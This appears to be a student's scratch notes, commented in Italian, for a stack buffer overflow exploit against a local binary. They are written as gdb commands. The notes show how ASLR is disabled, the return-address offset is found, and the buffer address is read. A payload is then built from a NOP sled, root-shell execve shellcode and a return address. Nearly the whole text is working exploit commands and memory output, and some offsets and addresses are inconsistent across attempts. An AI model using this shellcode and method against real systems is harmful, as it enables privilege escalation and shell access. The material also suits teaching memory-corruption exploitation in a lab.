sudo -i; echo 0 > /proc/sys/kernel/randomize_va_space
gdb binaryExploit

disass main
disass vuln

#Carichiamo il programma in memoria
run AAAA

#Cerchiamo di ottenere un segmentation fault
run $(perl -e 'print "A"x100')

#Cerchiamo di ottenere un indirizzo di ritorno di 0x42424242
run $(perl -e 'print "A"x622, "BBBB"') #L'indirizzo di ritorno è 0x42424242

#Inseriamo un breakpoint all'indirizzo della strcpy
b * 0x565561cb

#Cerchiamo l'indirizzo di ritorno
run $(perl -e 'print "A"x622, "BBBB"')
#Controlliamo il valore di ebp prendendolo dalle istruzioni sopra strcpy -0x5e4(%ebp)
x/10x $ebp-0x26a 
#0x26a e l'indirizzo del buffer
#Otteniamo cosi l'indice di ritorno
0xffffc9ee:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc9fe:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffca0e:     0x41414141      0x41414141

0xffffc9ee
"\xee\xc9\xff\xff"
#Indirizzo di ritorno = "\xee\xc9\xff\xff"

#Calcoliamo la lunghezza dello shellcode
python3 
len(b'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68');
#Lo shellcode è lungo 46 byte

#Calcoliamo la lunghezza dei NOP
#626 - 46 - 4 = lunghezza NOP (576)

run $(perl -e 'print "\x90"x576, "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68", "\xee\xc9\xff\xff"')



run $(perl -e 'print "\x90"x1476, "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68", "\xa8\xcb\xff\xff"')  0xffffcba8



#------------------------------------------


#Per ottenere la lunghezza dello shell code
python len(b'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68');


#Per tentativi proviamo ad ottenere un segmentation fault e verificare di riuscire a sovrascrivere l'indirizzo di ritorno
run $(perl -e 'print "A"x100') #Non da segmentation fault
run $(perl -e 'print "A"x200') #Da segmentation fault

run $(perl -e 'print "A"x116') #Da segmentation fault e mostra che l'indirizzo che cerca di chiamare è 0x41414141
#Cerchiamo di sostituirlo con un altro valore, ad esempio 0x42424242 ovvero BBBB
run $(perl -e 'print "A"x112, "BBBB"') #Da segmentation fault e mostra che l'indirizzo che cerca di chiamare è 0x42424242

#Quindi per sovrascrivere l'indirizzo di ritorno sono necessari 116 caratteri (112 per arrivare all'indirizzo di ritorno e 4 per sovrascriverlo)


#Iniettiamo uno shellcode mavevolo nel codice.
#Dalla funzione len otteniamo che la lunghezza dello shellcode è 46 byte

#INPUT TOTALE : 116 caratteri
#INPUT TOTALE : lunghezza NOP + shellcode + indirizzo di ritorno (4 byte)

#Dobbiamo quindi calcolare la lunghezza dei NOP

#116 - 46 - 4 = lunghezza NOP
#lunghezzaInput - lunghezzaShellcode - lunghezzaIndirizzoDiRitorno (4) = lunghezzaNOP

#Le NOP sono codificate in hex con \x90
run $(perl -e 'print "\x90"x66, "SHELLCODE", "INDIRIZZO DI RITORNO"')


#Inseriamo un brakpoint all'indirizzo della strcpy
0x565561cb <+34>:    call   0x56556030 <strcpy@plt>

b * 0x565561cb

#Per ottenere l'indirizzo di ritorno
run $(perl -e 'print "A"x112, "BBBB"')
#Controlliamo il valore di ebp prendendolo dalle istruzioni sopra strcpy -0x5e4(%ebp)
x/10x $ebp-0x5e4

0xffffc2f4:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc304:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc314:     0x41414141      0x41414141

#L'indirizzo di ritorno è 0xffffc2f4
#Dobbiamo girarlo per inserirlo nel payload

run $(perl -e 'print "\x90"x66, "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
", "\x8c\xce\xff\xff"')

1512 - 46 = 1466


run $(perl -e 'print "\x90"x1466, "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
", "\xf4\xc2\xff\xff"')

